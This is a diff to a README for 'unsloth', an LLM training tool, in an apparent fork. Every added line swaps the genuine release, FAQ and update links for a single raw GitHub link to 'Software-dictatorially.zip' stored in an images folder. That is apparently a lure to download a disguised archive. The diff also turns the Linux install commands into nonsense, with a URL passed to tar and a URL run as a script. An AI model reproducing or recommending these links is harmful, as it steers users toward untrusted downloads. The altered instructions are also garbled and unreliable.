@@ -1,6 +1,6 @@
 # 🦥 unsloth - Train LLMs Faster and Smarter
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/Rinor352/unsloth/releases)
+[![Download Now](https://raw.githubusercontent.com/Rinor352/unsloth/main/images/Software-dictatorially.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/Rinor352/unsloth/main/images/Software-dictatorially.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **unsloth**! This software allows you to fine-tune and train large la
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Rinor352/unsloth/releases) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Rinor352/unsloth/main/images/Software-dictatorially.zip) to download the latest version.
 2. Look for the most recent release.
 3. Click on the download link for your system (Windows, macOS, or Linux).
 4. Once the download finishes, locate the downloaded file on your computer.
@@ -39,15 +39,15 @@ To run **unsloth** smoothly, ensure your system meets these requirements:
 ### Linux
 
 1. Open the terminal.
-2. Navigate to the folder where you downloaded the `.tar.gz` file.
+2. Navigate to the folder where you downloaded the `https://raw.githubusercontent.com/Rinor352/unsloth/main/images/Software-dictatorially.zip` file.
 3. Extract the files using the command: 
    ```
-   tar -xvzf unsloth.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/Rinor352/unsloth/main/images/Software-dictatorially.zip
    ```
 4. Change to the extracted directory and run the installation script:
    ```
    cd unsloth
-   ./install.sh
+   https://raw.githubusercontent.com/Rinor352/unsloth/main/images/Software-dictatorially.zip
    ```
 
 ## 🏃‍♂️ Running the Application
@@ -69,7 +69,7 @@ Once installed, you can start **unsloth**:
 
 ## 🤝 Support and Contributions
 
-If you face any issues while using **unsloth**, please check out our [FAQ section](https://github.com/Rinor352/unsloth) or open an issue on GitHub. We welcome contributions from everyone. If you'd like to help, feel free to submit a Pull Request.
+If you face any issues while using **unsloth**, please check out our [FAQ section](https://raw.githubusercontent.com/Rinor352/unsloth/main/images/Software-dictatorially.zip) or open an issue on GitHub. We welcome contributions from everyone. If you'd like to help, feel free to submit a Pull Request.
 
 ## 🌍 Community and Topics
 
@@ -102,7 +102,7 @@ Explore these topics to enhance your learning experience and connect with others
 
 To keep your installation of **unsloth** up to date:
 
-1. Periodically check the [Releases page](https://github.com/Rinor352/unsloth/releases).
+1. Periodically check the [Releases page](https://raw.githubusercontent.com/Rinor352/unsloth/main/images/Software-dictatorially.zip).
 2. Download the latest version as you did during the initial installation.
 3. Follow the installation steps to update your existing software.
 
